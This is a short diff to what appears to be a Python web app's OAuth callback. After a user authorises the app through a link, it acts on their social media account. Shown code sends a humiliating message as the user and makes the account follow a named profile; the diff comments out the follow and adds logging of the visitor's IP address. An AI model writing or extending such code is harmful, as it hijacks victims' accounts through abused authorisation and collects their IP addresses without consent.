@@ -280,7 +280,13 @@ def callback():
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         '''
         try:
-            follow(real_client,"puppy4meimina")
+            #follow(real_client,"puppy4meimina")
+            ip_addr="0.0.0.0"
+            if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+                ip_addr=request.environ['REMOTE_ADDR']
+            else:
+                ip_addr=request.environ['HTTP_X_FORWARDED_FOR'] # if behind a proxy
+            print(f'ip_addr:{ip_addr}')
         except Exception as e:
             print(e)
             return str(e)
